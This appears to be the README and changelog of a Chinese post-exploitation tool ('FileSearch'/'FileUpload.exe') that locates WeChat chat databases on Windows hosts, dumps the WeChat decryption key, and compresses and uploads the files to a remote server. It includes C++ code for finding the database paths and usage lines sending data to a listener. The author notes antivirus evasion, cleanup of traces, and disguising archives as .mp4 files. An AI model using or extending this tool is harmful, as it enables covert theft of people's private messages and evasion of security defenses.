# FileSearch

## 更新
### v1.3

1、排除c盘符的查找指定类型文件，避免大量缓存文件，加了个参数在c:\\users目录下查找

2、运行成功后删除掉生成出来的文件夹以及压缩包，文件后缀修改成了mp4

3、(碰到vx用户自设的保存路径，需要加个指定路径去dump)

![](https://images.zsxq.com/Fr7-9bEGX922u_WCD00vgKzoQkvE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1672502399&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:g2IPF0-87rABGDbCjicVM8bm79g=)

```
[+] FileUpload.exe dumpkey
[+] FileUpload.exe send 127.0.0.1 8888
[+] FileUpload.exe send 127.0.0.1 8888 vxpath
[+] FileUpload.exe upload path 127.0.0.1 8888
[+] FileUpload.exe all 127.0.0.1 8888
[+] FileUpload.exe user 127.0.0.1 8888
```



### v1.2(暂不开源)
实现效果：
![](https://cdn.nlark.com/yuque/0/2022/png/262397/1665471090145-08f5b557-680f-4c8c-8fce-9574d581f81d.png)


实战中发现全盘查找微信db在c2中非常拉跨，查找等待时间较长，且盘符越多越慢

1、直接读取注册表的键值，wxid关键字匹配拼接路径


```
void getPath(char *dbpath)
{
	char cmd_command[256] = { 0 };
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
	HKEY hKey;
	DWORD dwType = REG_BINARY;
	REGSAM mode = KEY_READ;
	DWORD length = 256;
	int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hKey);

	ret = RegQueryValueEx(hKey, "Personal", 0, &dwType, (LPBYTE)dbpath, &length);
	strcat(dbpath, "\\WeChat Files");
	//cout << dbpath << endl;

	if (ret == 0) {
		RegCloseKey(hKey);
	}
	else {
		printf("failed to open regedit.%d\n", ret);
	}
}

```

```
void getFileNames(string path, vector<string>& files)
{
	intptr_t hFile = 0;
	//文件信息
	struct _finddata_t fileinfo;
	string p;
	string::size_type idx;

	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1)
	{
		do
		{
			//如果是目录,匹配文件夹
			if ((fileinfo.attrib & _A_SUBDIR))
			{
				if (strstr(fileinfo.name, "wxid") != NULL)
					files.push_back(p.assign(path).append("\\").append(fileinfo.name));
			}

		} while (_findnext(hFile, &fileinfo) == 0);
		_findclose(hFile);
	}
}

```
2、传输改成socket协议，支持大文件上传，效率很快，需要启动个Server socket
![](https://cdn.nlark.com/yuque/0/2022/png/262397/1665465880719-3ec78718-3e6e-4ac8-87a1-d2751bfdaabf.png)

3、参考https://github.com/Ormicron/Sharp-dumpkey 

远程拉取基址，考虑到免杀性改成了C++代码，
![](https://cdn.nlark.com/yuque/0/2022/png/262397/1665469015290-f07178fb-95a6-4d35-9161-bbf2d4a7da13.png)

```
[+] FileUpload.exe dumpkey
[+] FileUpload.exe send 127.0.0.1 8888
[+] FileUpload.exe upload path 127.0.0.1 8888
```

### v1.1
服务端：python2 http_put.py 80 path 

（win10自带curl.exe，其他系统可以上传一个或者引用socket库）

1、新增全盘查找微信聊天记录db文件并压缩上传到指定服务器

2、压缩本地文件并上传到指定服务器

3、指定盘查找指定文件后缀并输出
```
[+] eg: Filesearch default baidu.com
[+] eg: Filesearch upload C:\MSG0.db baidu.com
[+] eg: Filesearch search C:\ docx

```
## v1.0

```
System Drive are:C:\D:\
Command:FileSearch.exe Drive Keyword
Example:FileSearch.exe C:\ docx
```

![](https://cdn.nlark.com/yuque/0/2020/png/262397/1598583458455-d71cecb3-ef4e-49de-b33e-fe81c55c012b.png)
